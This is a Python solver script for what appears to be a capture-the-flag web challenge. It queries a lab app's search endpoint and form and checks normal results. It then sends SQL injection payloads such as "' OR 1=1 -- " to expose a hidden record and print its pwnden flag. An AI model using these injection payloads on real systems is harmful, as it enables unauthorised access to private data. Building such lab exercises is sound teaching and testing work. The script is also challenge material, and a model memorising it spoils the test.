"""Exercise actual SQL evaluation through the browser's GET search form."""
import json
import re
import sys
from urllib.parse import urlencode
from urllib.request import urlopen


def search(name):
    with urlopen("http://app:8000/api/search?" + urlencode({"name": name}), timeout=5) as response:
        return json.load(response)


def solve():
    assert search("mira")["matches"] == [{"name": "mira", "note": "전시 안내를 정리하는 사람"}]
    assert not search("keeper")["matches"]
    assert "error" in search("'") or not search("'")["matches"]
    result = search("' OR 1=1 -- ")
    if "error" in result:
        raise SystemExit("the intended SQL experiment did not execute")
    matches = [row["note"] for row in result["matches"] if row["name"] == "keeper"]
    if not matches:
        print("private record stayed private", file=sys.stderr)
        raise SystemExit(3)
    if len(matches) != 1 or re.fullmatch(r"pwnden\{[0-9a-f]{32}\}", matches[0]) is None:
        raise SystemExit("private record did not contain the run flag")
    with urlopen("http://app:8000/?" + urlencode({"name": "' OR 1=1 -- "}), timeout=5) as response:
        assert matches[0] in response.read().decode(), "the player search form did not expose the same result"
    # A second accepted expression covers a distinct successful input.
    assert matches[0] in [row["note"] for row in search("' OR public=0 -- ")["matches"]]
    print(matches[0])


if __name__ == "__main__":
    solve()
